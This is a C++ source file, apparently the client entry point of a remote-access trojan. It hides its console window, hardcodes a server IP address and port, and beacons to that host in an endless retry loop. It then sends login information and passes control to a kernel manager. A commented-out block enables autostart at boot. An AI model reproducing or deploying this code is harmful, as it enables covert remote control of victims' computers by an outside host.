// NinthClient.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "ClientSocket.h"
#include "loop.h"
#include "KernelManager.h"
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#include "BaseSet.h"

int main()
{
//	开机自动启动
//	CBaseSet bs;
//	bs.SetRun();
	

	string	 ServerIp;
	u_short      ServerPort = 9527;
	ServerIp = "183.184.228.68";
	HANDLE	hEvent = NULL;
	CClientSocket socketClient;
	DWORD	dwIOCPEvent;

	while(TRUE)	
	{
		if (!socketClient.Connect(ServerIp,ServerPort))
		{
			Sleep(3*60*1000);
			continue;
		}
		CKernelManager manager(&socketClient,const_cast<char*>(ServerIp.c_str()),ServerPort);
		manager.sendLoginInfo();
		socketClient.setManagerCallBack(&manager);
		Sleep(1000);

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, NULL);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
		}
		
	}
	return 0;
}

